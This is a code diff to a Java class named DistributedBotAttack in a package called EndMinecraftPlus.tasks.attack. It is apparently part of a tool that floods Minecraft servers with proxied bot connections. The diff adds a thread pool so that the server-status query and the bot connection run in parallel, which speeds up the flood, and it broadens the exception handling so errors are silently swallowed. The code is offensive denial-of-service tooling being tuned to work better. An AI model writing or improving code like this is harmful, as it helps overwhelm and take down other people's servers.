@@ -1,6 +1,5 @@
 package luohuayu.EndMinecraftPlus.tasks.attack;
 
-import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Constructor;
@@ -11,6 +10,8 @@ import java.net.Socket;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
@@ -38,6 +39,7 @@ public class DistributedBotAttack extends IAttack {
 	private Thread taskThread;
 	
 	public List<Client> clients=new ArrayList<Client>();
+	public ExecutorService pool=Executors.newCachedThreadPool();
 	
 	private ACProtocol acp=new ACProtocol();
 	
@@ -129,8 +131,15 @@ public class DistributedBotAttack extends IAttack {
 						clients.add(client);
 					}
 					
-					if(this.attack_motdbefore) getMotd(proxy,ip,port);
-					client.getSession().connect(false);
+					
+					if(this.attack_motdbefore) {
+						pool.submit(()->{
+							getMotd(proxy,ip,port);
+							client.getSession().connect(false);
+						});
+					}else{
+						client.getSession().connect(false);
+					}
 					
 					if(this.attack_maxconnect>0&&(clients.size()>this.attack_maxconnect)) return;
 					if(this.attack_joinsleep>0) Utils.sleep(attack_joinsleep);
@@ -193,12 +202,12 @@ public class DistributedBotAttack extends IAttack {
 					in.close();
 					out.close();
 					socket.close();
-				} catch (IOException e) {}
+				} catch (Exception e) {}
 				
 				return true;
 			}
 			socket.close();
-		} catch (IOException e) {}
+		} catch (Exception e) {}
 		return false;
 	}
 	
